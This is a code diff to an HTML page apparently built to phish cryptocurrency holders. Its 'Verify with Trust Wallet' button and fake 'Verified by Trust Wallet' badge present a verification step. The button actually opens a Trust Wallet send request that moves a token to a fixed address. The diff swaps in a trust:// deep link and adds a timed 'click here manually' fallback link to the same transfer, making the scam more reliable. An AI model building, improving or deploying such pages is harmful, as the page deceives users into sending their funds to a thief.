@@ -81,6 +81,16 @@
     input[type="checkbox"] {
       margin-right: 8px;
     }
+
+    .fallback-link {
+      margin-top: 12px;
+      font-size: 13px;
+    }
+
+    .fallback-link a {
+      color: #1e40af;
+      text-decoration: underline;
+    }
   </style>
 </head>
 <body>
@@ -96,6 +106,10 @@
 
     <button id="verifyBtn" disabled>Verify with Trust Wallet</button>
 
+    <div class="fallback-link" id="fallbackLink" style="display: none;">
+      If Trust Wallet doesn’t open, <a href="https://link.trustwallet.com/send?coin=195&address=TS99jGZnn4M5sMoT4GQLDmcmHbZvACGWeh&token_id=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" target="_blank">click here manually</a>.
+    </div>
+
     <div class="trust-badge">
       <img src="logo.png" width="20" />
       <span>✅ Verified by Trust Wallet</span>
@@ -109,14 +123,20 @@
   <script>
     const btn = document.getElementById("verifyBtn");
     const agree = document.getElementById("agree");
+    const fallbackLink = document.getElementById("fallbackLink");
 
     agree.addEventListener("change", () => {
       btn.disabled = !agree.checked;
     });
 
     btn.addEventListener("click", () => {
-      const trustLink = `https://link.trustwallet.com/send?coin=195&address=TS99jGZnn4M5sMoT4GQLDmcmHbZvACGWeh&token_id=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t`;
-      window.location.href = trustLink;
+      const trustDeepLink = "trust://link.trustwallet.com/send?coin=195&address=TS99jGZnn4M5sMoT4GQLDmcmHbZvACGWeh&token_id=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+      window.location.href = trustDeepLink;
+
+      // Show fallback link after 3 seconds if Trust Wallet doesn't open
+      setTimeout(() => {
+        fallbackLink.style.display = "block";
+      }, 3000);
     });
   </script>
 </body>
